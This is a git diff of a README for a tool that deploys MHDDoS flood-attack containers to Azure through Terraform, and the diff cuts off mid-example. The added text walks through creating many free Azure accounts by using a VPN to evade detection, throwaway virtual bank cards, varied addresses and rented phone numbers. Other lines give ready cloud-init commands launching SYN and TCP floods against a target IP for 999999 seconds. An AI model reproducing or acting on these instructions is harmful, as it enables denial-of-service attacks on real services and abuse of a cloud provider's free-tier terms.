@@ -68,8 +68,18 @@ In general, `udp/tcp/dns` mhddos attacks are network intensive so your free subs
 24 hours of active attacks. SYN mhddos attack doesn't require many network resources thus you can use your subscription
 longer.  
 After your subscription is over you can register a new Microsoft account and apply for a new free Azure subscription.
-The main rule here is to specify different phone number. If you have any other ideas or real experience on creating
-multiple Microsoft Azure free accounts - feel free to describe this here using a pull request.
+How to create Azure free account(200 USD for 30 days):
+1. Create a new email address (i.e gmail.com)
+2. Activate a VPN cause Microsoft may refuse giving you free credit if they notice multiple free subscription requests from the single IP
+3. Create a new [Microsoft Account](https://signup.live.com/signup?)
+4. Create a new virtual/internet bank card (i.e. in UA using Privat24) and send 1 USD to it
+5. Apply for a [free Azure subscription](https://azure.microsoft.com/en-us/offers/ms-azr-0044p/). Fill in name, surname,
+address and telephone number. You have to use different addresses and telephone numbers for each Microsoft Account. If you 
+ run out of available physical telephone numbers you can rent some online, i.e. [here](https://service.pvaverify.com/)
+6. Fill in credit card details from the step 4
+If everything's done correctly, you'll get your free subscription and will be ready for the next steps.
+If you have any other ideas or real experience on creating
+multiple Microsoft Azure free accounts - feel free to describe that here in this section using a pull request or by dropping me an email.
 
 # Getting started
 
@@ -96,17 +106,18 @@ cd mhddos-azure-terraform/
 az login
 ```
 4. Select target and attack method. Open the `cloud-init.yaml` file in any text editor. Find the `runcmd` attribute.  
-   - For original [MHDDOS](https://github.com/MHProDev/MHDDoS) `docker run --name mhddos --rm -d djebos/mhddos:latest` part of command is static and must be preserved. All your
-   customizations must follow this command as in example below:
-  ```yaml
-  # TCP syn flood attack on ip 1.1.1.1, port 53, 100 threads, duration 999999 seconds
-  runcmd:
-    - "docker run --name mhddos --rm -d djebos/mhddos:latest syn 1.1.1.1:53 100 999999 --debug"
+ - For original [MHDDOS](https://github.com/MHProDev/MHDDoS) `"docker run --name mhddos --rm -d djebos/mhddos:latest` part of command is static and must be preserved. All your
+customizations must follow this command as in example below:
+   
+```yaml
+# TCP syn flood attack on ip 1.1.1.1, port 53, 100 threads, duration 999999 seconds
+runcmd:
+  - "docker run --name mhddos --rm -d djebos/mhddos:latest syn 1.1.1.1:53 100 999999 --debug"
   # here 'syn 1.1.1.1:53 100 999999' is your attack configuration that fully compliant with original MHDDOS
-  ```
-  More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)
-  - For [MHDDOS_PROXY](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) 
-    `- "docker run --name mhddosProxy -d --rm portholeascend/mhddos_proxy` part of command is static and must be preserved.  
+```
+More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)
+ - For [MHDDOS_PROXY](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) 
+    `"docker run --name mhddosProxy -d --rm portholeascend/mhddos_proxy` part of command is static and must be preserved.   
     All your customizations must follow this command as in example below:
 ```yaml
 # TCP flood attack on ip 1.1.1.1, port 80, 3000 threads per core, proxy refresh every 300 seconds, requests per proxy 50
